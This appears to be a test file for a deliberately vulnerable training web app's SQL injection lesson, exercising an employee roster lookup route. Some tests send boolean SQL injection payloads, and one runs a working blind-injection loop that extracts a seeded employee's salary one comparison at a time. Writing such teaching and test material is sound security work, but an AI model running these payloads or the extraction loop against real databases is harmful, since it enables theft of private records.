from app.core.seed import seed_database


def test_roster_lookup_confirms_existing_employee(app, client):
    seed_database(app)
    response = client.get("/a03/roster-lookup", query_string={"id": "9"})
    assert response.status_code == 200
    assert b"Employee record found." in response.data


def test_roster_lookup_reports_no_match_for_nonexistent_id(app, client):
    seed_database(app)
    response = client.get("/a03/roster-lookup", query_string={"id": "9999"})
    assert response.status_code == 200
    assert b"No employee with that ID matches." in response.data


def test_roster_lookup_boolean_probe_discriminates_true_false(app, client):
    seed_database(app)
    always_true = client.get("/a03/roster-lookup", query_string={"id": "1 OR 1=1"})
    assert always_true.status_code == 200
    assert b"Employee record found." in always_true.data

    always_false = client.get("/a03/roster-lookup", query_string={"id": "1 AND 1=2"})
    assert always_false.status_code == 200
    assert b"No employee with that ID matches." in always_false.data


def test_roster_lookup_blind_extraction_recovers_target_salary(app, client):
    # Binary-search Morgan Reyes' (id=9) exact salary using ONLY the
    # boolean found/not-found oracle -- proving the entire route genuinely
    # leaks numeric data one comparison at a time, the same "prove it for
    # real, through the actual HTTP-level route, not a shortcut" discipline
    # used for the LDAP sub-project's blind extraction test.
    seed_database(app)
    low, high = 0, 1000000
    while low < high:
        mid = (low + high) // 2
        payload = f"9 AND (SELECT salary FROM a03_employees WHERE id=9) > {mid}"
        response = client.get("/a03/roster-lookup", query_string={"id": payload})
        found = b"Employee record found." in response.data
        if found:
            low = mid + 1
        else:
            high = mid
    assert low == 285000


def test_roster_lookup_still_works_with_teaching_text_hidden(app, client):
    from app.core.models import Settings
    from app.extensions import db

    seed_database(app)
    with app.app_context():
        settings = Settings.get()
        settings.show_explanations = False
        settings.show_exploit_instructions = False
        db.session.commit()

    response = client.get("/a03/roster-lookup", query_string={"id": "9"})
    assert response.status_code == 200
    assert b"Employee record found." in response.data
    assert b"Vulnerable vs. Secure" in response.data
    assert b'<div class="card-header">Detect</div>' not in response.data
    assert b"Tasks" not in response.data


def test_roster_lookup_link_appears_in_overview_once_registered(client):
    response = client.get("/a03/")
    assert response.status_code == 200
    assert b"Employee Lookup" in response.data
    assert b'href="/a03/roster-lookup"' in response.data
